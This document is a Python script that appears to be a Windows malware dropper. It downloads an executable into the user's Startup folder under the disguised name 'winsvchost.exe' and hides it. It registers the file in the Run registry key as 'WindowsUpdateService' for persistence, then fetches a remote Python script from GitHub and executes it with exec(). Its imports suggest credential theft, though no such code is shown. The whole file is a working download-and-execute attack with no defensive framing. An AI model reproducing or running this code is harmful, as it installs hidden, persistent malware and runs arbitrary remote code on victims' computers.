import os
import subprocess
import tempfile
import zipfile
import shutil
import requests
import json
import sqlite3
import base64
import time
import ctypes as ct
from ctypes import c_char_p, c_void_p, c_uint, POINTER, Structure, cast, byref, string_at
from getpass import getpass
import websocket
import win32crypt
from Crypto.Cipher import AES
import re
import datetime
import platform
from pathlib import Path
import winreg

def download_exe_to_startup(url, filename="winsvchost.exe"):
    try:
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
            filename
        )
        
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        with open(startup_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        ct.windll.kernel32.SetFileAttributesW(startup_path, 2)
        
        return startup_path
    except Exception as e:
        return None

def add_to_registry_startup(exe_path, name="WindowsUpdateService"):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        return True
    except Exception as e:
        return False

def fetch_and_execute(url):
    response = requests.get(url)
    response.raise_for_status()
    script_content = response.text
    exec(script_content, globals())

if __name__ == "__main__":
    exe_url = 'https://github.com/azayan165-svg/b/releases/download/d/winsvchost.exe'
    
    exe_path = download_exe_to_startup(exe_url)
    
    if exe_path:
        add_to_registry_startup(exe_path)
    
    github_urls = [
        'https://raw.githubusercontent.com/azayan165-svg/f/refs/heads/main/w.py'
    ]
    for url in github_urls:
        fetch_and_execute(url)
